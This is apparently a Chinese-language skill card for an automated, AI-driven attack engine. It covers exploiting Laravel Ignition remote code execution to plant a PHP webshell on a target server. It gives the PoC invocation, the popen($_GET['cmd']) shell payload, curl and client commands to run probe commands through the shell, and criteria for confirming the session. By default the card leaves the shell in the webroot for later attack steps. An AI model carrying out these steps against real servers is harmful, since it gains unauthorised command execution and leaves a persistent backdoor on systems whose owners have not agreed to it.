---
name: session-webshell-via-laravel
description: Laravel Ignition → 落 webshell 并登记通道（支撑类 · provides=session）
id: session.webshell_via_laravel
kind: session
runs_at: position
delivers: ["session"]
inputs: {"target_url":{"from":"graph"},"shell_url_path":{"from":"config","optional":true},"shell_file_path":{"from":"config","optional":true},"poc_path":{"from":"config","optional":true},"payload_dir":{"from":"config","optional":true},"client_path":{"from":"config","optional":true},"restore":{"from":"config","optional":true}}
tools: ["http","code"]
---

# Laravel Ignition → 落 webshell 并登记通道（支撑类 · provides=session）

## 何时用

目标须满足 `exploit.laravel_ignition_rce` 的前提：Ignition 版本处于受影响范围且 debug 开启。执行点为能运行命令并访问目标 HTTP 的标准工具机，不需要凭据；只需执行一条命令时使用该利用卡。

容器或后端应用可能没有独立地址，入口使用父主机发布的 endpoint。唯一图输入 `target_url` 由选择器从部署表解析，不在卡内另拼目标地址。

产出为经探针核对的 plain webshell 通道，供下游通过 `envelope.channel` 复用；是否满足下游权限要求由相应节点判断。

## 怎么做

执行点所需工具为 `python3`、POSIX shell（`sh`）、`base64`、`mkdir`、`printf`，以及既有 Ignition PoC 所需的 PHP、`phpggc`；手动 HTTP 核对使用 `curl`。

工具主路径沿用既有 Ignition PoC 写入 webshell，再通过 HTTP GET 核对探针回显：

```sh
# drop：由入口生成写入固定载荷的命令
python3 <poc_path> -u <target_url> -c '<write_command>'

# HTTP 核对：保留原卡的 curl 调用
curl -s "<target_url><shell_url_path>?cmd=<probe>"
```

> **这些是独立动作块**：一行一个块。多步就在一次回答里用 `{"actions":[…],"gap":1}` 批量给出（引擎按顺序执行、每块各记一条回执、块间默认歇 1 秒）；**不要把几行用 `&` 拼成一条长命令** —— 一处坏、整条废，长行还会把回执尾巴弄丢。

`<write_command>` 沿用入口对固定 PHP 载荷的 base64 写入命令，落点为 `shell_file_path`；`<probe>` 表示执行器包裹本次 marker 的 ASCII 探针。载荷保留 `popen($_GET['cmd'] . ' 2>&1', 'r')`，合并错误输出，避免命令报错被误读为空回显。

随卡脚本兜底定位：`client/agv_http_cmd.py` 是固定 plain HTTP 客户端，经同一执行器放到执行点；部署副本与通道驱动使用同一份客户端，没有自动切换工具的分支。

固定入口的 `probe` 实际调用形状如下，不使用上面的 curl 调用装配：

```sh
python3 <client_path> plain <target_url> <shell_url_path> '<wrapped_probe>' <timeout>
```

> 这里的 `<client_path>` 是**web 入口的请求驱动**（把命令包成一次 HTTP 请求送到那个 webshell），
> 与 msf 无关：在 msf 会话上跑命令走的是引擎本机的 msf 库，不需要这种客户端。

`<wrapped_probe>` 是入口按本次 marker 包裹的固定 `id -un; hostname`，`<timeout>` 来自入口运行参数，不新增为卡片输入。`target_url` 在入口去掉尾斜杠，`shell_url_path` 保证以斜杠开头。

输入定义见 `skill.json`。`target_url` 来自图，其余已声明选项来自配置：`shell_url_path` 与 `shell_file_path` 分别绑定目标 URL 路径和落盘路径；`poc_path`、`payload_dir`、`client_path` 属于执行点；`restore` 控制是否在调用末尾删除目标文件。跨环境调用核对或显式绑定这些路径，省略时沿用入口既有默认。

方法层可按现场选择载荷中除 `popen`、`2>&1` 外的细节、文件名、探针及是否清理；当前 fixed 入口固定载荷与探针，模型只填写已声明输入，不把方法层可变项扩成机器入参。通道描述符字段、探针判据与 marker 口径保持不变。

## 怎么判

沿用 freshness、target、effect 三个阻断闸，`identity_rule=null`，`effect_rule=target_echo_present`。

- freshness：核对 `probe` 的调用对应关系及原始输出中的本次 marker。
- target：核对 `target_url`、回显中的 `session_host` 与节点目标；主机名可为容器短标识。缺节点目标时沿用判定器与绑定输入的对照。`target_url` 来自输入，`session_host` 来自回显。
- effect：入口从 marker 区块首个非空行读取 `session_identity`、次行读取 `session_host`。注册规则 `target_echo_present` 在任一观测在场时通过，不额外增加两项必须同时存在的规则。

可核对的证据为 `call_id`、`target_url`、`session_identity`、`session_host`，`stdout` 指向 `probe` 原始输出。`drop` 输出仅供排错：Ignition 链自身 stdout 可能被 Laravel 错误页吞掉，不能据此认定会话成立。

通过：三个阻断闸均为 `pass`。不满足：任一阻断闸返回 `unsatisfied`，按既有聚合规则处理。不确定：没有阻断闸返回 `unsatisfied`，但存在缺失或不确定证据；身份与主机观测均缺失时，effect 为 `uncertain`，不猜填。

## 异常与恢复

链中 payload 入日志与写入两步返回 500 属于既有正常情况，失败与否看 `probe`。`/_ignition/execute-solution/` 的尾斜杠可能触发 301，将 POST 降级为 GET，沿用无尾斜杠入口。

非 ASCII 输出可能受页面 charset 影响，探针保持 ASCII。容器身份通常为 `www-data`（uid 33）；本卡只记录身份，不判断该身份是否足够。

副作用为执行点的客户端文件与目标 webroot 中的 webshell。`restore` 默认 false，通道留给后续节点并交运行层收尾；为 true 时，入口通过同一客户端请求删除目标落盘文件，且不提供可复用的 `envelope.channel`。清理后复核 GET 返回 404；主调用通过不替代清理核对。

通道描述符的 webshell/plain 形状及驱动字段属于契约；变更需同步驱动与验收，本次保持原样。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
